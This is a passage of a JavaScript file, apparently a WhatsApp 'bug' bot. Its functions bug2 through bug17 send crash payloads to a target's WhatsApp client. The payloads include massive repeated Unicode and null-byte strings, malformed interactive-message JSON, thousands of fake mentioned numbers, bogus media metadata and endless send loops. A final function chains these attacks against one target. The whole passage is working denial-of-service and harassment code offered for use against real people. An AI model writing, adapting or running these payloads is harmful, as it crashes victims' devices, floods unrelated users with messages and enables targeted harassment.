}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug2(XPanz, target, ptcp = false) {
await XPanz.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: "{꙰꙰}꙰꙰".repeat(99999) + "{꙰꙰ꦾ꙰꙰}꙰꙰".repeat(99999),
format: "EXTENSIONS_1"
},
nativeFlowResponseMessage: {
name: 'galaxy_message',
paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(99999)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3
}
}
}
}
},
ptcp ? { participant: { jid: target } } : {}
);
};

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug3(XPanz, target) {
while (true) {
try {
const Messages = [
"0@s.whatsapp.net",
"13135550002@s.whatsapp.net",
...Array.from({ length: 5000 }, () =>
"1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
),
];

for (let i = 0; i < 75; i++) {
const mediaFlood = {
viewOnceMessage: {
message: {
interactiveMessage: {
body: { text: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" },
contextInfo: {
forwardingScore: 9999,
isForwarded: true,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
mentionedJid: Messages,
},
nativeFlowMessage: {
buttons: [
{ name: "single_select", buttonParamsJson: "" },
{ name: "call_permission_request", buttonParamsJson: JSON.stringify({ status: true }) },
],
messageParamsJson: "{꙰꙰{꙰꙰".repeat(15000),
},
},
extendedTextMessage: {
text: "ꦾ꙰꙰".repeat(25000) + "@1".repeat(25000),
contextInfo: {
stanzaId: target,
participant: target,
quotedMessage: {
conversation: "𝗭𝗶𝗲𝗲 𝗱𝗲𝗹 𝗥𝗲𝘆... 桜🌸" +
"꙰❆꙰ꦾ࣯꙰꙰࣯".repeat(60000) +
"{꙰꙰@1꙰꙰}꙰꙰".repeat(30000),
},
},
inviteLinkGroupTypeV2: "DEFAULT",
},
},
},
};

const msg = generateWAMessageFromContent(target, mediaFlood, {});
await XPanz.relayMessage(target, msg.message, {
messageId: msg.key.id,
statusJidList: [target],
});
}
} catch (err) {
}

await new Promise(res => setTimeout(res, 5000));
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug4(target) {
try {
const message = {
botInvokeMessage: {
message: {
newsletterAdminInviteMessage: {
newsletterJid: "123456789@newsletter",
newsletterName: "You Know Faridz?" + 
"ꦽ".repeat(500) + 
"ꦾ".repeat(60000),
jpegThumbnail: "./ctx.jpg",
caption: "" + "ꦾ".repeat(60000),
inviteExpiration: Date.now() + 9999999999,
},
},
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(10000),
},
contextInfo: {
remoteJid: target,
participant: target,
stanzaId: XPanz.generateMessageTag(),
},
};

await XPanz.relayMessage(target, message, {
userJid: target,
});
} catch (error) {
console.log("error:\n" + error);
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug5(X, ptcp = true) {
await XPanz.sendMessage(X, {
text: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
contentText: "XhinBack",
footer: "Xhin Last",
viewOnce: true,
buttons: [{
buttonId: "🦠",
buttonText: {
displayText: "🦠"
},
type: 4,
nativeFlowInfo: {
name: "galaxy_message",
paramsJson: JSON.stringify({
title: `► F1 ◄${"᬴".repeat(60000)}`,
sections: [{
title: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
highlight_label: "label",
rows: []
}]
})
}
}],
headerType: 1,
}, { ephemeralExpiration: 5, timeStamp:Date.now()});
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug6(target) {
XPanz.relayMessage(target, {
extendedTextMessage: {
text: "ꦾ".repeat(20000) + "@1".repeat(20000),
contextInfo: {
stanzaId: target,
participant: target,
quotedMessage: {
conversation: "〽️⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑〽️" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
},
disappearingMode: {
initiator: "CHANGED_IN_CHAT",
trigger: "CHAT_SETTING",
},
},
inviteLinkGroupTypeV2: "DEFAULT",
},
},
{
paymentInviteMessage: {
serviceType: "UPI",
expiryTimestamp: Date.now() + 5184000000,
},
},
{
participant: {
jid: target,
},
},
{
messageId: null,
}
);
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug7(target, ptcp = false) {
try {
const largePayload = JSON.stringify({
data: "💀".repeat(2000)
});

const msg = await generateWAMessageFromContent(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "X-Angel InvosionSql",
hasMediaAttachment: false
},
body: {
text: "X-Angel InvosionSql💀",
},
nativeFlowMessage: {
messageParamsJson: largePayload,
buttons: [
{
name: "cta_url",
buttonParamsJson: JSON.stringify({
url: "https://example.com",
text: "Visit Website"
})
},
{
name: "call_permission_request",
buttonParamsJson: JSON.stringify({
text: "Allow Call Access"
})
},
{
name: "payment",
buttonParamsJson: JSON.stringify({
currency: "USD",
amount: 999,
paymentText: "Donate $9.99"
})
},
{
name: "buy_button",
buttonParamsJson: JSON.stringify({
productId: "123456",
buttonText: "Buy Now"
})
},
{
name: "native_flow_cta",
buttonParamsJson: JSON.stringify({
flowId: "com.whatsapp.catalog",
text: "Open Catalog"
})
}
]
}
}
}
}
}, {});

await XPanz.relayMessage(target, msg.message, ptcp ? {
participant: { jid: target }
} : {});

console.log(chalk.green("done"));
} catch (err) {
console.error(chalk.red("Error in X-Angel InvosionSqlForce:"), err);
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug8(target) {
const TrigerMsg = "\u0003\u0003\u0003\u0003\u0003\u0003\u0003".repeat(150000);

const delaymention = Array.from({ length: 50000 }, (_, r) => ({
title: TrigerMsg,
rows: Array(100).fill().map((_, i) => ({ 
title: TrigerMsg,
id: `${r + 1}_${i}`,
description: TrigerMsg,
subRows: Array(50).fill().map((_, j) => ({
title: TrigerMsg,
id: `${r + 1}_${i}_${j}`
}))
}))
}));
const contextInfo = {
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 50000 }, () => 
"1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
)
],
participant: target,
remoteJid: "status@broadcast",
forwardingScore: 9999,
isForwarded: true,
forwardedNewsletterMessageInfo: {
newsletterJid: "333333333333@newsletter",
serverMessageId: 999999,
newsletterName: TrigerMsg
},
quotedMessage: {
locationMessage: {
degreesLatitude: -9.4882766288,
degreesLongitude: 9.48827662899,
name: TrigerMsg.repeat(10),
address: TrigerMsg,
url: null
},
contextInfo: {
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 50000 }, () => 
"2" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
)
],
quotedMessage: {
documentMessage: {
title: TrigerMsg.repeat(5),
fileLength: "999999999",
jpegThumbnail: Buffer.alloc(1000000, 'binary').toString('base64'),
contextInfo: {
mentionedJid: [
"0@s.whatsapp.net",
...Array.from({ length: 50000 }, () => 
"3" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
)
]
}
}
}
}
}
};

const MSG = {
viewOnceMessage: {
message: {
listResponseMessage: {
title: "ErlanggaOfficial " + TrigerMsg,
listType: 2,
buttonText: null,
sections: delaymention,
singleSelectReply: { 
selectedRowId: "🔴" + TrigerMsg 
},
contextInfo: contextInfo,
description: "Dont Bothering Me Bro!!! " + TrigerMsg
}
}
},
contextInfo: {
channelMessage: true,
statusAttributionType: 2,
expiration: 86400 * 7, // 7 hari
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: Buffer.alloc(1000000, 'binary').toString('base64')
}
};

const msg = generateWAMessageFromContent(target, MSG, {});

const targets = [
"status@broadcast",
target,
...Array.from({ length: 33333 }, () => 
"1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
)
];

for (const targetId of targets) {
try {
await XPanz.relayMessage(targetId, msg.message, {
messageId: msg.key.id,
statusJidList: [target],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: target },
content: undefined
},
 
...Array.from({ length: 100 }, (_, i) => ({
tag: "user",
attrs: { id: i },
content: TrigerMsg
}))
]
}
]
},
{
tag: "payload",
attrs: { size: "huge" },
content: TrigerMsg
}
]
});

await new Promise(resolve => setTimeout(resolve, 100));
} catch (e) {
console.error("Error sending to", targetId, ":", e);
}
}

if (target) {
for (let i = 0; i < 5; i++) {
try {
await XPanz.relayMessage(
target,
{
statusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25,
editedMessage: {
protocolMessage: {
key: msg.key,
type: 25,
editedMessage: {
textMessage: {
text: TrigerMsg
}
}
}
}
}
}
}
},
{
additionalNodes: [
{
tag: "meta",
attrs: { 
is_status_mention: "EelanggaOfficial Bug Delay Activited " + TrigerMsg,
iteration: i
},
content: [
...Array.from({ length: 50 }, (_, j) => ({
tag: "mention",
attrs: { id: j },
content: TrigerMsg
}))
]
}
]
}
);

await new Promise(resolve => setTimeout(resolve, 200));
} catch (e) {
console.error("Error in status mention", i, ":", e);
}
}
}

console.log("Enhanced 24hDelay executed successfully!");
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug9(isTarget) {
const msg = await generateWAMessageFromContent(isTarget, {
buttonsMessage: {
text: "🩸",
contentText: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
footerText: "𝐑𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
buttons: [
{
buttonId: ".null",
buttonText: {
displayText: " #RizxvelzExec1St " + "\u0000".repeat(500000)
},
type: 1
}
],
headerType: 1
}
}, {})

await XPanz.relayMessage(isTarget, msg.message, {
messageId: msg.key.id,
participant: { jid: isTarget }
})
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug10(isTarget, show = true) {
let msg = await generateWAMessageFromContent(isTarget, {
buttonsMessage: {
text: "🩸",
contentText: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
footerText: "𝐑𝐢𝐳𝐱𝐯𝐞𝐥𝐳 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
buttons: [
{
buttonId: ".null",
buttonText: {
displayText: " #RizxvelzExec1St " + "\u0000".repeat(500000),
},
type: 1,
},
],
headerType: 1,
},
}, {});

await XPanz.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined,
},
],
},
],
},
],
});

if (show) {
await XPanz.relayMessage(
isTarget,
{
groupStatusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25,
},
},
},
},
{
additionalNodes: [
{
tag: "meta",
attrs: {
is_status_mention: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
},
content: undefined,
},
],
}
);
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug11(isTarget) {
await XPanz.relayMessage(
isTarget,
{
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: " #RizxvelzExec1St ",
format: "DEFAULT",
},
nativeFlowResponseMessage: {
name: "call_permission_request",
paramsJson: "\u0000".repeat(1000000),
version: 3,
},
},
},
},
},
{
participant: { jid: isTarget },
}
);
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug12(isTarget, show = true) {
const msg = await generateWAMessageFromContent(
isTarget,
{
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: {
text: " #RizxvelzExec1St ",
format: "DEFAULT",
},
nativeFlowResponseMessage: {
name: "call_permission_request",
paramsJson: "\u0000".repeat(1000000),
version: 3,
},
},
},
},
},
{}
)

await XPanz.relayMessage("status@broadcast", msg.message, {
messageId: msg.key.id,
statusJidList: [isTarget],
additionalNodes: [
{
tag: "meta",
attrs: {},
content: [
{
tag: "mentioned_users",
attrs: {},
content: [
{
tag: "to",
attrs: { jid: isTarget },
content: undefined,
},
],
},
],
},
],
})

if (show) {
await XPanz.relayMessage(
isTarget,
{
groupStatusMentionMessage: {
message: {
protocolMessage: {
key: msg.key,
type: 25,
},
},
},
},
{
additionalNodes: [
{
tag: "meta",
attrs: {
is_status_mention: "🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉",
},
content: undefined,
},
],
}
)
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug13(target, Ptcp = true) {
try {
await XPanz.relayMessage(target, {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
mimetype:
"application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
fileName: "⿻",
fileEncSha256:
"LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
directPath:
"/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
mediaKeyTimestamp: "1726867151",
contactVcard: true,
jpegThumbnail: 'https://files.catbox.moe/k65fvb.jpg',
},
hasMediaAttachment: true,
},
body: {
text: "饝箔饝箔饾棩饾棶饾棿饾\n" + "ꦾ".repeat(28000),
},
nativeFlowMessage: {
messageParamsJson: "{}",
},
contextInfo: {
mentionedJid: [target, "6289526156543@s.whatsapp.net"],
forwardingScore: 1,
isForwarded: true,
fromMe: false,
participant: "0@s.whatsapp.net",
remoteJid: "status@broadcast",
quotedMessage: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mimetype:
"application/vnd.openxmlformats-officedocument.presentationml.presentation",
fileSha256:
"QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
fileLength: "9999999999999",
pageCount: 1316134911,
mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
fileEncSha256:
"wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
directPath:
"/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
mediaKeyTimestamp: "1724474503",
contactVcard: true,
thumbnailDirectPath:
"/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
thumbnailSha256:
"njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
thumbnailEncSha256:
"gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
jpegThumbnail: "",
},
},
},
},
},
},
},
Ptcp
? {
participant: {
jid: target,
},
}
: {}
);
} catch (error) {
console.log("❌ Gagal mengirim pesan: ", error.message);
}
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug14(target) {
await XPanz.relayMessage(target, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
title: "ꦾ".repeat(60000),
locationMessage: {
degreesLatitude: 0,
degreesLongtitude: 0,
},
hasMediaAttachment: true,
},
body: {
text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚" + "ោ៝".repeat(20000),
},
nativeFlowMessage: {
messageParamsJson: "",
buttons: [
{
name: "cta_url",
buttonParamsJson: ""
},
{
name: "call_permission_request",
buttonParamsJson: ""
},
],
},
},
},
},
}, {});

await XPanz.relayMessage(target, {
groupInviteMessage: {
inviteCode: "XxX",
inviteExpiration: "18144000",
groupName: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚" + "ោ៝".repeat(20000),
caption: "ោ៝".repeat(20000),
},
}, { participant: { jid: target }, });
}

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function bug15(target) {
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
console.log(chalk.red(`TreaterSql Bug Send To Target ${target}`));

try {
for (let x = 0; x < 5; x++) {
const echoMsg = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
interactiveMessage: {
header: { title: "", hasMediaAttachment: false },
body: { text: "" },
footer: {
text: "🩸⃟𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧 • 𝐈͢𝐧͡𝐯͜𝐢͢𝐜͜𝐭͡𝐮͢𝐬"
},
nativeFlowMessage: {
messageParamsJson: "{".repeat(9999),
buttons: [
{ name: 'single_select', buttonParamsJson: '\u0000' + Poseidon },
{ name: 'mpm', buttonParamsJson: '{}'.repeat(1000) + Poseidon },
{ name: 'mpm', buttonParamsJson: '\u0003' + Poseidon },
{ name: 'call_permission_request', buttonParamsJson: '{}' }
]
},
contextInfo: {
mentionedJid: [
target,
"0@s.whatsapp.net",
...Array.from({ length: 9000 }, () =>
"1" + Math.floor(Math.random() * 250208) + "@s.whatsapp.net"
)
]
}
}
}
}
}), { userJid: target, timestamp: Math.floor(Date.now() / 1000) });

echoMsg.messageTimestamp = Math.floor(Date.now() / 1000);
await XPanz.relayMessage(target, echoMsg.message, {
participant: { jid: target },
messageId: echoMsg.key.id
});
await sleep(3000);
await XPanz.sendMessage(target, { delete: echoMsg.key });
}

await XPanz.relayMessage(target, {
ephemeralMessage: {
message: {
interactiveMessage: {
header: {
documentMessage: {
url: "https://mmg.whatsapp.net/v/t62.7119-24/30623531_8925861100811717_6603685184702665673_n.enc?...",
mimetype: "application/json",
fileSha256: "ZUQzs6adM+DC5ZI3MuHr3RbsAaj66LvmZ1R8+El5cqc=",
fileLength: "401",
mediaKey: "X6f0YZpo7xItqTXuawYmZJy6eLaXv9m/1nFZq2rW7p0=",
fileName: "𝐏͢𝐨͡𝐬͜𝐞͢𝐢͜𝐝͡𝐨͢𝐧".repeat(10),
fileEncSha256: "6gmEaQ6o3q7TgsBLKLYlr8sJmbb+yYxpYLuQ1F4vbBs=",
mediaKeyTimestamp: "1731681321"
},
hasMediaAttachment: true
},
body: { text: "ꦾ".repeat(300000) + "@1".repeat(70000) },
contextInfo: {
mentionedJid: ["1@newsletter"]
}
}
}
}
}, { participant: { jid: target } }, { messageId: null });

await XPanz.relayMessage(target, {
videoMessage: {
url: "https://example.com/fake.mp4",
mimetype: "video/mp4",
caption: "꧔꧈".repeat(15000),
fileSha256: Buffer.from("00", "hex"),
fileLength: 999999999,
height: 9999,
width: 9999,
mediaKey: Buffer.from("00", "hex"),
fileEncSha256: Buffer.from("00", "hex"),
directPath: "/v/t62.7118-24/...",
mediaKeyTimestamp: 999999999,
jpegThumbnail: Buffer.from("00", "hex"),
contextInfo: {
forwardingScore: 999,
isForwarded: true,
externalAdReply: {
title: "꧔꧈",
body: "꧔꧈",
thumbnail: Buffer.from("00", "hex"),
mediaType: 1,
renderLargerThumbnail: true,
showAdAttribution: true
}
}
}
}, { participant: { jid: target } });

console.log("\x1b[32m[✔] TreaterSql Sukses Send");

while (true) {
const flowPayload = {
viewOnceMessage: {
message: {
interactiveResponseMessage: {
body: { text: '🩸POSEIDON CORE SQL', format: 'OVERFLOW' },
nativeFlowResponseMessage: {
name: 'ai_entry_point',
paramsJson: "{".repeat(9999),
version: 3
},
nativeFlowMessage: {
name: 'galaxy_message',
paramsJson: "{".repeat(9999),
version: 3
}
}
}
}
};

const carouselPayload = {
viewOnceMessage: {
message: {
carouselMessage: {
cards: Array.from({ length: 200 }, () => ({
cardHeader: {
title: "\u0000".repeat(999),
subtitle: 'POSEIDON | CORE999',
thumbnail: Buffer.alloc(1024 * 32).fill(0)
},
cardContent: { title: '\u0000', description: '\n'.repeat(500) },
buttons: [
{ name: 'call_permission_request', buttonParamsJson: '\u0000' },
{ name: 'mpm', buttonParamsJson: '{'.repeat(1000) },
{ name: 'single_select', buttonParamsJson: '' }
]
}))
}
}
}
};

await XPanz.relayMessage(target, flowPayload, {
participant: { jid: target }
});

await XPanz.relayMessage(target, carouselPayload, {
participant: { jid: target }
});

await sleep(500);
}

} catch (err) {
console.error("\x1b[31m[✖] TreaterSql Crash Send Failed:", err.message);
}
}

async function bug16(XPanz, target, mention) {
 const msg = await generateWAMessageFromContent(target, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 messageSecret: crypto.randomBytes(32)
 },
 interactiveResponseMessage: {
 body: {
 text: " t.me/rizxvelzexct ",
 format: "DEFAULT"
 },
 nativeFlowResponseMessage: {
 name: "flex_agency",
 paramsJson: "\u0000".repeat(999999),
 version: 3
 },
 contextInfo: {
 isForwarded: true,
 forwardingScore: 9741,
 forwardedNewsletterMessageInfo: {
 newsletterName: "x!s - agency",
 newsletterJid: "120363319314627296@newsletter",
 serverMessageId: 1
 }
 }
 }
 }
 }
 }, {});

 await XPanz.relayMessage("status@broadcast", msg.message, {
 messageId: msg.key.id,
 statusJidList: [target],
 additionalNodes: [
 {
 tag: "meta",
 attrs: {},
 content: [
 {
 tag: "mentioned_users",
 attrs: {},
 content: [
 { tag: "to", attrs: { jid: target }, content: undefined }
 ]
 }
 ]
 }
 ]
 });

 if (mention) {
 await XPanz.relayMessage(target, {
 statusMentionMessage: {
 message: {
 protocolMessage: {
 key: msg.key,
 fromMe: false,
 participant: "0@s.whatsapp.net",
 remoteJid: "status@broadcast",
 type: 25
 }
 }
 }
 }, {
 additionalNodes: [
 {
 tag: "meta",
 attrs: { is_status_mention: "🕸️ XennExcrt1st" },
 content: undefined
 }
 ]
 });
 }
 await new Promise(resolve => setTimeout(resolve, 9000));
}

async function bug17(target) {
 await XPanz.relayMessage(target, 
 {
 locationMessage: {
 degreesLongitude: 0,
 degreesLatitude: 0,
 name: "Have you ever heard the name Izii?" + "ི꒦ྀ".repeat(9000), 
 url: "https://t.me/Lountrc" + "ི{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰".repeat(9000) + ".id", 
 address: "Tell them I haven't fallen yet" + "ིꦾ⃟꙰⃞⃠ꦾ⃟꙰⃞⃠ꦾ⃟꙰⃞⃠ꦾ⃟꙰⃞⃠ꦾ⃟꙰⃞⃠".repeat(9000), 
 contextInfo: {
 externalAdReply: {
 renderLargerThumbnail: true, 
 showAdAttribution: true, 
 body: "................", 
 title: "ིꦾ⃟꙰⃞⃠ꦾ⃟꙰⃞⃠ꦾ⃟꙰⃞⃠ꦾ⃟꙰⃞⃠".repeat(9000), 
 sourceUrl: "https://t.me/Lountrcz" + "ི{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰".repeat(9000) + ".id", 
 thumbnailUrl: null, 
 quotedAd: {
 advertiserName: "ི{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰".repeat(9000), 
 mediaType: 2,
 jpegThumbnail: "/9j/4AAKossjsls7920ljspLli", 
 caption: "{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰{꙰꙰}꙰꙰", 
 }, 
 pleaceKeyHolder: {
 remoteJid: "0@s.whatsapp.net", 
 fromMe: false, 
 id: "ABCD1234567"
 }
 }
 }
 }
 }, 
 {});
}

const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[91m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'
const teks_hitam = '\x1b[30m';
const back_biru = '\x1b[44m';
const back_ungu = '\x1b[45m';
const back_biru_ungu = '\x1b[48;2;128;0;255m';
const biruUnguMuda = '\x1b[38;2;173;150;255m';

//~~~~~~~~~~~~~~~~~~~~~~~~~\\

async function AllFuncAndro(target) { 
for (let i = 0; i <= 1; i++){
await bug1(target)
await sleep(7000)
await bug2(XPanz, target, ptcp = true)
await sleep(7000)
await bug3(target)
await sleep(7000)
await bug4(target)
await sleep(7000)
await bug5(X, ptcp = true)
